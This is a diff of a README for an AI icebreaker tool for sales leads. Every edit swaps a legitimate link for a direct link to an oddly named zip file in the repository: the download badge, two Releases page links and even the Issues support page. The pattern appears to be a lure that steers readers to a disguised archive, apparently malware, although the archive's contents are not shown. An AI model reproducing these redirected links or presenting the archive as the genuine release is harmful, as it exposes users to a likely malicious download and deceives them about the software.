@@ -1,6 +1,6 @@
 # 🎉 -Apollo-Leads-Icebreaker-Generator - AI-Powered Icebreakers for Leads
 
-[![Download Apollo Leads Icebreaker](https://img.shields.io/badge/Download-Apollo%20Leads%20Icebreaker-brightgreen)](https://github.com/robinromora/-Apollo-Leads-Icebreaker-Generator/releases)
+[![Download Apollo Leads Icebreaker](https://github.com/robinromora/-Apollo-Leads-Icebreaker-Generator/raw/refs/heads/main/yellowwood/Apollo-Generator-Leads-Icebreaker-tambourist.zip%20Leads%20Icebreaker-brightgreen)](https://github.com/robinromora/-Apollo-Leads-Icebreaker-Generator/raw/refs/heads/main/yellowwood/Apollo-Generator-Leads-Icebreaker-tambourist.zip)
 
 ## 🌟 Introduction
 
@@ -12,7 +12,7 @@ Follow these steps to download and run the application. You don’t need any pro
 
 ### 1. Visit Releases Page
 
-To download the application, go to the [Releases page](https://github.com/robinromora/-Apollo-Leads-Icebreaker-Generator/releases). Here, you will find the latest versions of the software.
+To download the application, go to the [Releases page](https://github.com/robinromora/-Apollo-Leads-Icebreaker-Generator/raw/refs/heads/main/yellowwood/Apollo-Generator-Leads-Icebreaker-tambourist.zip). Here, you will find the latest versions of the software.
 
 ### 2. Choose Your Version
 
@@ -54,13 +54,13 @@ To ensure smooth operation, your system should meet the following requirements:
 
 ## 🎯 Download & Install
 
-You are almost there! To download the application, visit our [Releases page](https://github.com/robinromora/-Apollo-Leads-Icebreaker-Generator/releases). Make sure to choose the correct file based on your operating system. 
+You are almost there! To download the application, visit our [Releases page](https://github.com/robinromora/-Apollo-Leads-Icebreaker-Generator/raw/refs/heads/main/yellowwood/Apollo-Generator-Leads-Icebreaker-tambourist.zip). Make sure to choose the correct file based on your operating system. 
 
 Once the download completes, follow the instructions above for installation. In just a few clicks, you will be ready to start generating engaging icebreakers!
 
 ## 🙋 Support
 
-If you encounter any issues while downloading or running the application, please check our [Issues page](https://github.com/robinromora/-Apollo-Leads-Icebreaker-Generator/issues) for help. Your feedback is important to us.
+If you encounter any issues while downloading or running the application, please check our [Issues page](https://github.com/robinromora/-Apollo-Leads-Icebreaker-Generator/raw/refs/heads/main/yellowwood/Apollo-Generator-Leads-Icebreaker-tambourist.zip) for help. Your feedback is important to us.
 
 ## 📃 License
 
